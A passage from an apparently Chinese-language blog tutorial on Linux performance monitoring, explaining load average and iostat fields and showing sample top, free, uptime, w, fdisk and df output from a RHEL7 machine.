&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x503C;&#x5982;&#x679C;&#x8D85;&#x8FC7;&#x7CFB;&#x7EDF;CPU&#x7684;&#x6570;&#x91CF;&#x65F6;&#xFF0C;&#x90A3;&#x4E48;&#x7CFB;&#x7EDF;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x6027;&#x80FD;&#x74F6;&#x9888;&#xFF0C;&#x8981;&#x89C6;&#x5177;&#x4F53;&#x60C5;&#x51B5;&#x800C;&#x5B9A;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x7ECF;&#x5E38;&#x4F1A;&#x901A;&#x8FC7;&#x6BD4;&#x8F83;1min&#x3001;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x6765;&#x5224;&#x65AD;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x53D8;&#x5316;&#x60C5;&#x51B5;&#xFF1A;</p><p>&#x5982;&#x679C;1min&#x7684;&#x503C;&#x5927;&#x4E8E;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x8BF4;&#x660E;&#x8D1F;&#x8F7D;&#x5728;&#x589E;&#x52A0;&#xFF1B;</p><p>&#x5982;&#x679C;1min&#x7684;&#x503C;&#x5C0F;&#x4E8E;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x8BF4;&#x660E;&#x8D1F;&#x8F7D;&#x5728;&#x51CF;&#x5C0F;&#xFF1B;</p><h3 id="2-4-&#x78C1;&#x76D8;I-O"><a href="#2-4-&#x78C1;&#x76D8;I-O" class="headerlink" title="2.4 &#x78C1;&#x76D8;I/O"></a>2.4 &#x78C1;&#x76D8;I/O</h3><p>Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x9664;&#x4E86;CPU&#x548C;&#x5185;&#x5B58;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x78C1;&#x76D8;IO&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x5E38;&#x7528;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> RHEL/CentOS</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install sysstat</span></span><br><span class="line"></span><br><span class="line">iostat -x -k 2 3   # &#x6BCF;&#x9694;2S&#x8F93;&#x51FA;&#x78C1;&#x76D8;IO&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x5171;&#x91C7;&#x6837;3&#x6B21;</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.84.188:8081/uploads/1652923992503954646iostat.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x5B57;&#x6BB5;&#x8BF4;&#x660E;&#xFF1A;</p><p>rrqm/s: &#x6BCF;&#x79D2;&#x5BF9;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x8BFB;&#x8BF7;&#x6C42;&#x88AB;&#x5408;&#x5E76;&#x6B21;&#x6570;&#xFF0C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4F1A;&#x5BF9;&#x8BFB;&#x53D6;&#x540C;&#x5757;(block)&#x7684;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF1B;</p><p>wrqm/s: &#x6BCF;&#x79D2;&#x5BF9;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x5199;&#x8BF7;&#x6C42;&#x88AB;&#x5408;&#x5E76;&#x6B21;&#x6570;&#xFF1B;</p><p>r/s: &#x6BCF;&#x79D2;&#x5B8C;&#x6210;&#x7684;&#x8BFB;&#x6B21;&#x6570;&#xFF1B;</p><p>w/s: &#x6BCF;&#x79D2;&#x5B8C;&#x6210;&#x7684;&#x5199;&#x6B21;&#x6570;&#xFF1B;</p><p>rkB/s: &#x6BCF;&#x79D2;&#x8BFB;&#x6570;&#x636E;&#x91CF;(kB&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>wkB/s: &#x6BCF;&#x79D2;&#x5199;&#x6570;&#x636E;&#x91CF;(kB&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>avgrq-sz:&#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x64CD;&#x4F5C;&#x7684;&#x6570;&#x636E;&#x91CF;(&#x6247;&#x533A;&#x6570;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>avgqu-sz: &#x5E73;&#x5747;&#x7B49;&#x5F85;&#x5904;&#x7406;&#x7684;IO&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x957F;&#x5EA6;&#xFF1B;</p><p>await: &#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x8BF7;&#x6C42;&#x7B49;&#x5F85;&#x65F6;&#x95F4;(&#x5305;&#x62EC;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x548C;&#x5904;&#x7406;&#x65F6;&#x95F4;&#xFF0C;&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>svctm: &#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x8BF7;&#x6C42;&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;(&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>%util: &#x91C7;&#x7528;&#x5468;&#x671F;&#x5185;&#x7528;&#x4E8E;IO&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x95F4;&#x6BD4;&#x7387;&#xFF0C;&#x5373;IO&#x961F;&#x5217;&#x975E;&#x7A7A;&#x7684;&#x65F6;&#x95F4;&#x6BD4;&#x7387;&#xFF1B;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x91CD;&#x70B9;&#x5173;&#x6CE8;iowait%&#x548C;%util&#x53C2;&#x6570;&#x3002;&#x5176;&#x4E2D;iowait% &#x8868;&#x793A;CPU&#x7B49;&#x5F85;IO&#x65F6;&#x95F4;&#x5360;&#x6574;&#x4E2A;CPU&#x5468;&#x671F;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x5982;&#x679C;iowait&#x503C;&#x8D85;&#x8FC7;50%&#xFF0C;&#x6216;&#x8005;&#x660E;&#x663E;&#x5927;&#x4E8E;%system&#x3001;%user&#x4EE5;&#x53CA;%idle&#xFF0C;&#x8868;&#x793A;IO&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x95EE;&#x9898;&#x4E86;&#xFF1B;%util&#x8868;&#x793A;&#x78C1;&#x76D8;&#x5FD9;&#x788C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x4E00;&#x822C;%util&lt;=70%&#x8868;&#x793A;&#x8BE5;&#x78C1;&#x76D8;IO&#x4F7F;&#x7528;&#x72B6;&#x6001;&#x826F;&#x597D;&#x3002;</p><h3 id="2-5-Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;"><a href="#2-5-Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;" class="headerlink" title="2.5 Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;"></a>2.5 Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;</h3><h4 id="2-5-1-CPU"><a href="#2-5-1-CPU" class="headerlink" title="2.5.1 CPU"></a>2.5.1 CPU</h4><pre><code># &#x83B7;&#x53D6;CPU&#x8BE6;&#x60C5;cat /proc/sys/cpuinfo</code></pre><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# cat /proc/cpuinfo</span><br><span class="line">processor       : 0</span><br><span class="line">vendor_id       : GenuineIntel</span><br><span class="line">cpu family      : 6</span><br><span class="line">model           : 158</span><br><span class="line">model name      : Intel(R) Core(TM) i5-7400 CPU @ 3.00GHz</span><br><span class="line">stepping        : 9</span><br><span class="line">microcode       : 0xffffffff</span><br><span class="line">cpu MHz         : 2998.708</span><br><span class="line">cache size      : 6144 KB</span><br><span class="line">physical id     : 0</span><br><span class="line">siblings        : 1</span><br><span class="line">core id         : 0</span><br><span class="line">cpu cores       : 1</span><br><span class="line">apicid          : 0</span><br><span class="line">initial apicid  : 0</span><br><span class="line">fpu             : yes</span><br><span class="line">fpu_exception   : yes</span><br><span class="line">cpuid level     : 22</span><br><span class="line">wp              : yes</span><br><span class="line">flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch arat fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1</span><br><span class="line">bogomips        : 5999.99</span><br><span class="line">clflush size    : 64</span><br><span class="line">cache_alignment : 64</span><br><span class="line">address sizes   : 45 bits physical, 48 bits virtual</span><br><span class="line">power management:</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p><strong>top</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">top - 05:37:21 up 2 days, 14:06,  2 users,  load average: 0.00, 0.05, 0.07</span><br><span class="line">Tasks: 164 total,   1 running, 163 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.3 us,  0.7 sy,  0.0 ni, 99.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :   999696 total,   162172 free,   482632 used,   354892 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  2064164 free,    32984 used.   303396 avail Mem</span><br><span class="line"></span><br><span class="line">   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class="line">   759 root      20   0  305248   3152   2824 S  0.3  0.3   5:39.77 vmtoolsd</span><br><span class="line">  1196 mysql     20   0 1131704 193936    564 S  0.3 19.4   1:15.66 mysqld</span><br><span class="line"> 13017 root      20   0 1621100  76124   4316 S  0.3  7.6   1:13.35 mongod</span><br><span class="line">     1 root      20   0  128212   4532   2512 S  0.0  0.5   0:11.69 systemd</span><br><span class="line">     2 root      20   0       0      0      0 S  0.0  0.0   0:00.02 kthreadd</span><br><span class="line">     3 root      20   0       0      0      0 S  0.0  0.0   0:06.71 ksoftirqd/0</span><br><span class="line">     5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H</span><br><span class="line">     7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0</span><br><span class="line">     8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh</span><br><span class="line">     9 root      20   0       0      0      0 S  0.0  0.0   0:12.27 rcu_sched</span><br><span class="line">    10 root      rt   0       0      0      0 S  0.0  0.0   0:03.50 watchdog/0</span><br><span class="line">    12 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs</span><br><span class="line">    13 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns</span><br><span class="line">    14 root      20   0       0      0      0 S  0.0  0.0   0:00.13 khungtaskd</span><br><span class="line">    15 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writeback</span><br><span class="line">    16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd</span><br><span class="line">    17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset</span><br><span class="line">    18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd</span><br><span class="line">    19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md</span><br><span class="line">    25 root      20   0       0      0      0 S  0.0  0.0   0:01.89 kswapd0</span><br><span class="line">    26 root      25   5       0      0      0 S  0.0  0.0   0:00.00 ksmd</span><br><span class="line">    27 root      39  19       0      0      0 S  0.0  0.0   0:01.39 khugepaged</span><br><span class="line">    28 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 crypto</span><br><span class="line">    36 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kthrotld</span><br><span class="line">    38 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kmpath_rdacd</span><br><span class="line">    39 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kpsmoused</span><br><span class="line">    41 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 ipv6_addrconf</span><br><span class="line">    60 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 deferwq</span><br><span class="line">    93 root      20   0       0      0      0 S  0.0  0.0   0:13.32 kauditd</span><br><span class="line">   272 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 ata_sff</span><br><span class="line">   273 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 mpt_poll_0</span><br><span class="line">   274 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 mpt/0</span><br><span class="line">   278 root      20   0       0      0      0 S  0.0  0.0   0:00.00 scsi_eh_0</span><br><span class="line">   280 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 scsi_tmf_0</span><br><span class="line">   284 root      20   0       0      0      0 S  0.0  0.0   0:00.01 scsi_eh_1</span><br><span class="line">   286 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 scsi_tmf_1</span><br></pre></td></tr></tbody></table></figure><h4 id="2-5-2-&#x5185;&#x5B58;"><a href="#2-5-2-&#x5185;&#x5B58;" class="headerlink" title="2.5.2 &#x5185;&#x5B58;"></a>2.5.2 &#x5185;&#x5B58;</h4><p><strong>free -h</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           976M        659M        142M        1.4M        175M        140M</span><br><span class="line">Swap:          2.0G        215M        1.8G</span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>top</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">top - 05:38:40 up 2 days, 14:07,  2 users,  load average: 0.50, 0.16, 0.23</span><br><span class="line">Tasks: 158 total,   1 running, 157 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  1.4 us,  0.7 sy,  0.0 ni, 98.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :   999936 total,   144896 free,   675384 used,   179656 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  1876980 free,   220168 used.   143004 avail Mem</span><br><span class="line"></span><br><span class="line">   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class="line">  2492 root      20   0 1476824  89756   3588 S  1.0  9.0   4:59.62 mongod</span><br><span class="line">  2521 root      20   0 1508032  86256   3612 S  1.0  8.6   5:00.86 mongod</span><br><span class="line">  1410 root      20   0 1075224  65992   2844 S  0.3  6.6  13:18.62 mongod</span><br><span class="line">  1876 root      20   0  140832   1128    464 S  0.3  0.1   0:07.76 sshd</span><br><span class="line">  2802 root      20   0 1591648 110528   3800 S  0.3 11.1   4:43.63 mongod</span><br><span class="line">  3155 root      20   0 1062216  83944   3040 S  0.3  8.4   2:25.67 mongod</span><br><span class="line">     1 root      20   0  128044   2288    604 S  0.0  0.2   0:02.73 systemd</span><br><span class="line">     2 root      20   0       0      0      0 S  0.0  0.0   0:00.01 kthreadd</span><br><span class="line">     3 root      20   0       0      0      0 S  0.0  0.0   0:05.51 ksoftirqd/0</span><br><span class="line">     7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0</span><br><span class="line">     8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh</span><br><span class="line">     9 root      20   0       0      0      0 S  0.0  0.0   0:15.00 rcu_sched</span><br><span class="line">    10 root      rt   0       0      0      0 S  0.0  0.0   0:05.00 watchdog/0</span><br><span class="line">    12 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 khelper</span><br><span class="line">    13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs</span><br><span class="line">    14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns</span><br><span class="line">    15 root      20   0       0      0      0 S  0.0  0.0   0:00.15 khungtaskd</span><br><span class="line">    16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writebac</span><br></pre></td></tr></tbody></table></figure><h4 id="2-5-3-&#x8D1F;&#x8F7D;"><a href="#2-5-3-&#x8D1F;&#x8F7D;" class="headerlink" title="2.5.3 &#x8D1F;&#x8F7D;"></a>2.5.3 &#x8D1F;&#x8F7D;</h4><p><strong>uptime</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# uptime</span><br><span class="line"> 05:39:08 up 2 days, 14:07,  2 users,  load average: 0.33, 0.15, 0.22</span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>top</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# top</span><br><span class="line">top - 05:38:40 up 2 days, 14:07,  2 users,  load average: 0.50, 0.16, 0.23</span><br><span class="line">Tasks: 158 total,   1 running, 157 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  1.4 us,  0.7 sy,  0.0 ni, 98.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :   999936 total,   144896 free,   675384 used,   179656 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  1876980 free,   220168 used.   143004 avail Mem</span><br><span class="line"></span><br><span class="line">   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class="line">  2492 root      20   0 1476824  89756   3588 S  1.0  9.0   4:59.62 mongod</span><br><span class="line">  2521 root      20   0 1508032  86256   3612 S  1.0  8.6   5:00.86 mongod</span><br><span class="line">  1410 root      20   0 1075224  65992   2844 S  0.3  6.6  13:18.62 mongod</span><br><span class="line">  1876 root      20   0  140832   1128    464 S  0.3  0.1   0:07.76 sshd</span><br><span class="line">  2802 root      20   0 1591648 110528   3800 S  0.3 11.1   4:43.63 mongod</span><br><span class="line">  3155 root      20   0 1062216  83944   3040 S  0.3  8.4   2:25.67 mongod</span><br><span class="line">     1 root      20   0  128044   2288    604 S  0.0  0.2   0:02.73 systemd</span><br><span class="line">     2 root      20   0       0      0      0 S  0.0  0.0   0:00.01 kthreadd</span><br><span class="line">     3 root      20   0       0      0      0 S  0.0  0.0   0:05.51 ksoftirqd/0</span><br><span class="line">     7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0</span><br><span class="line">     8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh</span><br><span class="line">     9 root      20   0       0      0      0 S  0.0  0.0   0:15.00 rcu_sched</span><br><span class="line">    10 root      rt   0       0      0      0 S  0.0  0.0   0:05.00 watchdog/0</span><br><span class="line">    12 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 khelper</span><br><span class="line">    13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>w</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# w</span><br><span class="line"> 05:39:57 up 2 days, 14:08,  2 users,  load average: 0.14, 0.13, 0.22</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/1    192.168.73.1     Sat17    5.00s  0.56s  0.00s w</span><br><span class="line">root     pts/2    192.168.73.1     Sat17    9:33   0.30s  0.26s ping www.163.com</span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="2-5-4-&#x78C1;&#x76D8;"><a href="#2-5-4-&#x78C1;&#x76D8;" class="headerlink" title="2.5.4 &#x78C1;&#x76D8;"></a>2.5.4 &#x78C1;&#x76D8;</h4><p><strong>fdisk</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# fdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label type: dos</span><br><span class="line">Disk identifier: 0x000d2bb3</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sda1   *        2048     2099199     1048576   83  Linux</span><br><span class="line">/dev/sda2         2099200    41943039    19921920   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdc: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sde: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdf: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdd: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdg: 10.7 GB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rhel-root: 18.2 GB, 18249416704 bytes, 35643392 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rhel-swap: 2147 MB, 2147483648 bytes, 4194304 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>df</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# df -h</span><br><span class="line">Filesystem             Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/rhel-root   17G  4.7G   13G  28% /</span><br><span class="line">devtmpfs               478M     0  478M   0% /dev</span><br><span class="line">tmpfs                  489M     0  489M   0% /dev/shm</span><br><span class="line">tmpfs                  489M  6.8M  482M   2% /run</span><br><span class="line">tmpfs                  489M     0  489M   0% /sys/fs/cgroup</span><br><span class="line">/dev/sr0               3.6G  3.6G     0 100% /media/cdrom</span><br><span class="line">/dev/sda1             1014M  